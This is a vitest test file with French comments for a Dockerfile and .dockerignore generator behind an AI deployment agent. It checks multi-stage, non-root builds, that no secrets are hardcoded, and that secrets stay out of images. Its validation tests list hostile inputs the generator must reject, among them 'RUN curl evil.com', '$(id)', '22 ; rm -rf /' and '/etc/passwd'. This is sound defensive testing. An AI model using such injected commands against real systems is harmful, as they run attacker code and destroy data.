import { describe, expect, it } from "vitest"

import { generateDockerfile, generateDockerignore, pickTemplate } from "./dockerfile.js"

const nextStandalone = {
  famille: "node", sortie: "standalone", version: "22",
  gestionnaire: "pnpm", port: 3000, repertoire: null,
} as const

describe("generateDockerfile", () => {
  it("produit un Dockerfile Next.js en sortie standalone", () => {
    const df = generateDockerfile(nextStandalone)

    expect(df).toContain("FROM node:22-alpine")
    expect(df).toContain("pnpm")
    expect(df).toContain("EXPOSE 3000")
    expect(df).toContain(".next/standalone")
  })

  /**
   * Trois propriétés que le gabarit doit garantir sans que l'IA ait à y penser — ce sont
   * précisément celles qu'un Dockerfile écrit à la volée oublie.
   */
  it.each([
    ["node", "standalone"], ["node", "server"], ["node", "static"],
    ["python", "server"], ["static", "static"],
  ] as const)("construit en plusieurs étapes et sans root : %s/%s", (famille, sortie) => {
    const df = generateDockerfile({
      famille, sortie, version: famille === "python" ? "3.12" : "22",
      gestionnaire: famille === "node" ? "pnpm" : null,
      port: 3000, repertoire: sortie === "static" ? "dist" : null,
    })

    // Plusieurs étapes : les outils de construction ne partent pas en production.
    expect((df.match(/^FROM /gm) ?? []).length).toBeGreaterThanOrEqual(2)
    // Non-root : une faille applicative ne donne pas la machine.
    expect(df).toMatch(/^USER (?!root)/m)
    // Pas de secret en dur, jamais.
    expect(df).not.toMatch(/ENV\s+\w*(SECRET|TOKEN|PASSWORD|KEY)\w*=/i)
  })

  it("respecte le gestionnaire de paquets détecté", () => {
    for (const [gestionnaire, attendu] of [
      ["pnpm", "pnpm install"], ["npm", "npm ci"], ["yarn", "yarn install"], ["bun", "bun install"],
    ] as const) {
      const df = generateDockerfile({ ...nextStandalone, gestionnaire })
      expect(df).toContain(attendu)
    }
  })

  /**
   * `npm ci` exige un package-lock.json. Sans gestionnaire détecté, le gabarit doit se
   * rabattre sur une commande qui marche sans fichier de verrouillage, sinon la
   * construction échoue sur un dépôt parfaitement valide.
   */
  it("se rabat sur une commande qui marche sans fichier de verrouillage", () => {
    const df = generateDockerfile({ ...nextStandalone, gestionnaire: null })

    expect(df).toContain("npm install")
    expect(df).not.toContain("npm ci")
  })

  it("copie le répertoire de sortie pour un site statique", () => {
    const df = generateDockerfile({
      famille: "node", sortie: "static", version: "22",
      gestionnaire: "pnpm", port: 80, repertoire: "dist",
    })

    expect(df).toContain("dist")
    expect(df).toMatch(/FROM (nginx|caddy|busybox)/)
  })

  it("produit un Dockerfile Python ASGI", () => {
    const df = generateDockerfile({
      famille: "python", sortie: "server", version: "3.12",
      gestionnaire: null, port: 8000, repertoire: null,
    })

    expect(df).toContain("FROM python:3.12")
    expect(df).toContain("requirements.txt")
    expect(df).toContain("EXPOSE 8000")
  })

  /**
   * Le paramètre vient d'une déduction sur le dépôt du client, donc indirectement d'un
   * texte que l'agent a lu. Une version fantaisiste doit être refusée ici, pas produire
   * un `FROM node:$(curl evil.com)-alpine`.
   */
  it("refuse une version qui n'en est pas une", () => {
    for (const mauvais of ["22-alpine\nRUN curl evil.com", "$(id)", "../..", "22 ; rm -rf /", ""]) {
      expect(() => generateDockerfile({ ...nextStandalone, version: mauvais })).toThrow(/version/i)
    }
  })

  it("refuse un répertoire de sortie qui échappe à la racine", () => {
    for (const mauvais of ["../etc", "/etc/passwd", "dist; rm -rf /", "di\nst"]) {
      expect(() =>
        generateDockerfile({ famille: "node", sortie: "static", version: "22",
                             gestionnaire: "pnpm", port: 80, repertoire: mauvais })
      ).toThrow(/répertoire/i)
    }
  })

  it("refuse un port hors bornes", () => {
    for (const mauvais of [0, -1, 70000, 1.5, Number.NaN]) {
      expect(() => generateDockerfile({ ...nextStandalone, port: mauvais })).toThrow(/port/i)
    }
  })

  /** Déterminisme : le jalon 3b s'appuie dessus pour reconnaître un redéploiement. */
  it("produit exactement le même texte pour les mêmes paramètres", () => {
    expect(generateDockerfile(nextStandalone)).toBe(generateDockerfile(nextStandalone))
  })
})

describe("generateDockerignore", () => {
  it("exclut ce qui ne doit jamais entrer dans une image", () => {
    const ignore = generateDockerignore()

    for (const attendu of ["node_modules", ".git", ".env", "Dockerfile", ".next", "dist"]) {
      expect(ignore.split("\n")).toContain(attendu)
    }
  })

  /**
   * Le `.env` est la ligne la plus importante du fichier : sans elle, les secrets du
   * client partent dans une couche d'image, lisible par quiconque obtient l'image.
   */
  it("exclut toutes les formes de fichier d'environnement", () => {
    const lignes = generateDockerignore().split("\n")

    expect(lignes).toContain(".env")
    expect(lignes.some((l) => l.startsWith(".env."))).toBe(true)
  })
})

describe("pickTemplate", () => {
  it.each([
    ["node", "standalone", "standalone"],
    ["node", "server", "server"],
    ["node", "static", "static"],
    ["python", "server", "server"],
    ["static", "static", "static"],
  ] as const)("choisit un gabarit pour %s/%s", (famille, sortie, attendu) => {
    expect(pickTemplate(famille, sortie)).toBe(attendu)
  })

  /**
   * Le refus est un résultat, pas un échec (spec §5.4) : quand aucun gabarit ne convient,
   * le composeur demandera un Dockerfile plutôt que d'improviser.
   */
  it.each([
    ["php", "server"], ["go", "server"], ["inconnu", "inconnu"], ["node", "inconnu"],
    ["python", "static"],
  ] as const)("rend null sans improviser pour %s/%s", (famille, sortie) => {
    expect(pickTemplate(famille, sortie)).toBeNull()
  })
})

/**
 * Défauts trouvés par relecture via de vraies constructions Docker (huit défauts sur
 * quinze constructions), invisibles aux tests de forme ci-dessus car ils ne portent que
 * sur le texte. Chaque test ici cible le défaut précis mesuré, pas une reformulation.
 */
describe("port effectif à l'exécution, pas seulement documentatif (C1)", () => {
  it("standalone : le port choisi devient la variable que server.js lit", () => {
    const df = generateDockerfile({ ...nextStandalone, port: 8080 })

    expect(df).toContain("EXPOSE 8080")
    expect(df).toContain("ENV PORT=8080")
  })

  it.each([
    [
      "node/static",
      { famille: "node", sortie: "static", version: "22", gestionnaire: "pnpm", repertoire: "dist" } as const,
    ],
    [
      "statique pur",
      { famille: "static", sortie: "static", version: "1", gestionnaire: null, repertoire: "public" } as const,
    ],
  ] as const)("%s : nginx écoute réellement le port choisi", (_label, base) => {
    const df = generateDockerfile({ ...base, port: 8080 })

    expect(df).toContain("EXPOSE 8080")
    expect(df).toMatch(/listen 8080;/)
  })
})

describe("généré Dockerignore : fuite de secrets imbriqués (C2)", () => {
  it("exclut les .env et .npmrc à toute profondeur, pas seulement à la racine", () => {
    const lignes = generateDockerignore().split("\n")

    expect(lignes).toContain("**/.env")
    expect(lignes.some((l) => l.startsWith("**/.env."))).toBe(true)
    expect(lignes).toContain(".npmrc")
    expect(lignes).toContain("**/.npmrc")
  })

  it("exclut les artefacts Python locaux (venv, bytecode)", () => {
    const lignes = generateDockerignore().split("\n")

    expect(lignes).toContain(".venv")
    expect(lignes).toContain("venv")
    expect(lignes).toContain("__pycache__")
    expect(lignes).toContain("*.pyc")
  })
})

describe("le .dockerignore et le gabarit statique ne s'annulent plus (I3)", () => {
  it("réintroduit le répertoire de sortie qu'on lui désigne", () => {
    const lignes = generateDockerignore("dist").split("\n")

    expect(lignes).toContain("dist")
    expect(lignes).toContain("!dist")
  })

  it("sans argument, le comportement déjà éprouvé ne change pas", () => {
    const lignes = generateDockerignore().split("\n")

    expect(lignes.some((l) => l.startsWith("!"))).toBe(true) // seule !.env.example
    expect(lignes.filter((l) => l.startsWith("!"))).toEqual(["!.env.example"])
  })
})

describe("Node/serveur transporte les répertoires d'exécution usuels (I4)", () => {
  it("copie vues, locales, migrations et gabarits quand ils existent", () => {
    const df = generateDockerfile({
      famille: "node", sortie: "server", version: "22",
      gestionnaire: "pnpm", port: 3000, repertoire: null,
    })

    for (const dir of ["public", "views", "locales", "prisma", "static", "templates"]) {
      expect(df).toContain(`COPY --from=builder /app/${dir} ./${dir}`)
    }
  })
})

describe("Next standalone : permissions et interface d'écoute (I1, I2)", () => {
  it("le dossier .next appartient à l'utilisateur applicatif, cache compris", () => {
    const df = generateDockerfile(nextStandalone)

    expect(df).toMatch(/COPY --from=builder --chown=skynode:skynode/)
    expect(df).toContain("mkdir -p .next/cache && chown -R skynode:skynode .next/cache")
  })

  it("écoute sur toutes les interfaces, pas seulement l'identifiant du conteneur", () => {
    const df = generateDockerfile(nextStandalone)

    expect(df).toContain("ENV HOSTNAME=0.0.0.0")
  })
})

describe("bun se construit dans une image qui a bun (I5)", () => {
  it.each([
    ["standalone", { ...nextStandalone, gestionnaire: "bun" } as const],
    [
      "server",
      { famille: "node", sortie: "server", version: "22", gestionnaire: "bun", port: 3000, repertoire: null } as const,
    ],
    [
      "static",
      { famille: "node", sortie: "static", version: "22", gestionnaire: "bun", port: 80, repertoire: "dist" } as const,
    ],
  ] as const)("%s : l'étape de construction a un binaire bun", (_label, params) => {
    const df = generateDockerfile(params)

    expect(df).toMatch(/^FROM oven\/bun:[\w.-]+ AS builder$/m)
    expect(df).toContain("bun run build")
  })
})

describe("Python : hors bornes documentées (I6)", () => {
  it("journalise sans tampon (M5)", () => {
    const df = generateDockerfile({
      famille: "python", sortie: "server", version: "3.12",
      gestionnaire: null, port: 8000, repertoire: null,
    })

    expect(df).toContain("ENV PYTHONUNBUFFERED=1")
  })
})

describe("images de base épinglées (M1)", () => {
  it("busybox du gabarit statique pur n'est jamais :latest", () => {
    const df = generateDockerfile({
      famille: "static", sortie: "static", version: "1",
      gestionnaire: null, port: 80, repertoire: "public",
    })

    expect(df).toMatch(/^FROM busybox:[\w.-]+ AS prepare$/m)
    expect(df).not.toContain("FROM busybox AS prepare")
  })
})
